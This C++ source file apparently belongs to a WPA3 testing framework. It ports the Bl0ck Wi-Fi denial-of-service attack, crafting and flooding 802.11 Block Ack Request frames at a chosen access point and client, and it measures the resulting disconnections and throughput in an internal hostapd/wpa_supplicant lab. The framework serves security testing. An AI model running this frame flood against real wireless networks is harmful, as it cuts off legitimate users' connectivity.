#include "attacks/DoS_soft/bl0ck/bl0ck.h"
#include "config/RunStatus.h"
#include "logger/log.h"
#include "system/iface.h"
#include <random>
#include <chrono>
#include <thread>

#include "ex_program/hostapd/hostpad.h"
#include "ex_program/ip/ip.h"
#include "logger/error_log.h"
#include "observer/iperf_wrapper.h"
#include "observer/tshark_wrapper.h"

// rewrite of python
// https://github.com/efchatz/Bl0ck/tree/main?tab=readme-ov-file
namespace wpa3_tester::bl0ck_attack{
    using namespace std;
    using namespace filesystem;
    using namespace Tins;
    using namespace chrono;

    RadioTap get_BAR_frame(const HWAddress<6> &ap_hw, const HWAddress<6> &sta_hw) {
        Dot11BlockAckRequest bar(sta_hw, ap_hw); //for some reason is dst first
        bar.fragment_number(4);
        bar.start_sequence(1175);
        const vector<uint8_t> payload_data = {
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
            0xff, 0xff, 0x7f, 0x92, 0x08, 0x80
        };
        const RadioTap rt{}; // fill with driver?
        return rt / bar / RawPDU(payload_data);
    }


    RadioTap && get_BA_frame(HWAddress<6> hw_address, HWAddress<6> sta_hw){
        //TODO
        throw not_implemented_error("BA not implemented");
    };

    void block(const string& STA_mac,
               const string& AP_mac,
               const string& iface,
               const int frame_num,
               const string& attack_type,
               const int duration_sec,
               const bool is_random) {
        assert(attack_type == "BAR" || attack_type == "BAR");     //TODO add BARS

        log(LogLevel::INFO, "Starting BARorBA exploit - Type: %s", attack_type.c_str());

        const NetworkInterface iface_obj(iface);
        const HWAddress<6> ap_hw(AP_mac);
        PacketSender sender;

        log(LogLevel::INFO, "Sending frames - Duration: %d sec, Concurrent frames: %d", duration_sec, frame_num);

        const auto start_time = steady_clock::now();
        const auto end_time = start_time + seconds(duration_sec);

        int iteration = 0;
        while (steady_clock::now() < end_time) {
            try {
                const HWAddress<6> sta_hw = is_random ? HWAddress<6>(iface::rand_mac()) : HWAddress<6>(STA_mac);

                // Determine subtype: BAR=8, BA=9
                RadioTap block_frame;
                if (attack_type == "BAR") {
                    block_frame = get_BAR_frame(ap_hw, sta_hw);
                } else if (attack_type == "BA") {
                    block_frame = get_BA_frame(ap_hw, sta_hw);
                }
                log(LogLevel::DEBUG, "Sending batch %d", iteration);
                for (int i = 0; i < frame_num; ++i) {sender.send(block_frame, iface_obj);}
                this_thread::sleep_for(100ms);
                iteration++;
            } catch (const exception& e) {
                log(LogLevel::ERROR, "Error sending frame at iteration %d: %s", iteration, e.what());
                throw;
            }
        }
        log(LogLevel::INFO, "Block attack completed after %d iterations", iteration);
    }

    void speed_observation_start(RunStatus &rs){
        //observer::start_musezahn(rs, "mz_gen", "client", "access_point");

        const string c_mac = rs.get_actor("client")["mac"];
        const string a_mac = rs.get_actor("attacker")["mac"];
        const string ap_mac = rs.get_actor("access_point")["mac"];

        const string mac_filter =
    "(wlan host " + c_mac + " or wlan host " + a_mac + " or wlan host " + ap_mac + ")"
    " or ((wlan[0] & 0xfc) == 0x84 or (wlan[0] & 0xfc) == 0x94)";

        const string full_filter = mac_filter;
        observer::start_tshark(rs, "attacker", mac_filter); //FIXME

        //FIXME vypadá to, že
        observer::start_tshark(rs, "client", mac_filter); //FIXME
        //observer::start_thark(rs, "access_point", "udp port 5201");
        this_thread::sleep_for(seconds(10));//FIXME wait for tshark
        observer::start_iperf3_server(rs,"iperf_server", "access_point");
        rs.process_manager.wait_for("iperf_server","Server listening on ", seconds(30));
        observer::start_iperf3(rs,"iperf_client", "client",  "access_point");
    }

    void setup_attack(RunStatus& rs){
        if (rs.config.at("actors").at("access_point").at("source") != "internal"
            || rs.config.at("actors").at("client").at("source") != "internal") {
            throw runtime_error("only internal actors are supported");
            }

        // -------- hostapd AP ------------
        hostapd::run_hostapd(rs, "access_point");
        rs.process_manager.wait_for("access_point", "AP-ENABLED", seconds(10));
        log(LogLevel::INFO, "access_point is running");
        set_ip(rs, "access_point");

        // -------- wpa_supplicant STA ------------
        hostapd::run_wpa_supplicant(rs, "client");
        rs.process_manager.wait_for("client", "Successfully initialized wpa_supplicant", seconds(10));
        set_ip(rs, "client");

        rs.process_manager.wait_for("client", "EVENT-CONNECTED", seconds(30));
        rs.process_manager.wait_for("access_point", "EAPOL-4WAY-HS-COMPLETED", seconds(30));
        log(LogLevel::INFO, "client is connected");
    }


    void run_bl0ck_attack(RunStatus& rs){
        const auto& att_cfg = rs.config.at("attack_config");
        const auto& attacker = rs.get_actor("attacker");

        const string iface   = attacker["iface"];

        const string STA_mac = rs.get_actor("client")["mac"];
        const string AP_mac = rs.get_actor("access_point")["mac"];

        const string bl0ck_att_type = att_cfg.at("attack_variant").get<string>();
        const int duration = att_cfg.at("attack_time_sec").get<int>();
        const int frame_num = att_cfg.at("frame_number").get<int>();
        const bool is_random = att_cfg.at("random").get<bool>();

        speed_observation_start(rs);

        log(LogLevel::INFO, "Block Attack START (Type: %s, Frames: %d)", bl0ck_att_type.c_str(), frame_num);
        this_thread::sleep_for(seconds(10));
        if(bl0ck_att_type == "BAR" || bl0ck_att_type == "BA"){
           block(STA_mac, AP_mac, iface, frame_num, bl0ck_att_type, duration, is_random);
        } else {
            log(LogLevel::ERROR, "Unsupported attack type: %s", bl0ck_att_type.c_str());
            /*if (bl0ck_att_type == "BARS":
            BAR_SC_exploit(targeted_AP, targeted_STA, WNIC, int(numOfConcurrentFrames), int(stopAfter), int(randomMAC), int(verboseMessages))
            }*/
            throw not_implemented_error("Unsupported attack type");
        }
        this_thread::sleep_for(seconds(10));
        log(LogLevel::INFO, "Block Attack END");
    }

    void stats_bl0ck_attack(const RunStatus& rs){
        log(LogLevel::INFO , "Bl0ck attack stats");

        vector<observer::graph_lines> events;
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED"),"DISCONN", "red"});
        events.push_back({get_time_logs(rs, "client", "@START"),"START","black"});
        events.push_back({get_time_logs(rs, "client", "@END"),"END","black"});


        observer::tshark_graph(rs, "attacker", events);

        // iperf graphs
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH"),"SWITCH","blue"});
        events.push_back({get_time_logs(rs, "client", "CTRL-EVENT-DISCONNECTED"),"DISCONN","red"});
        observer::tshark_graph(rs, "client", events);
        //observer::tshark_graph(rs, "access_point", events);

        log(LogLevel::INFO, "Bl0ck attack stop");
    }
}
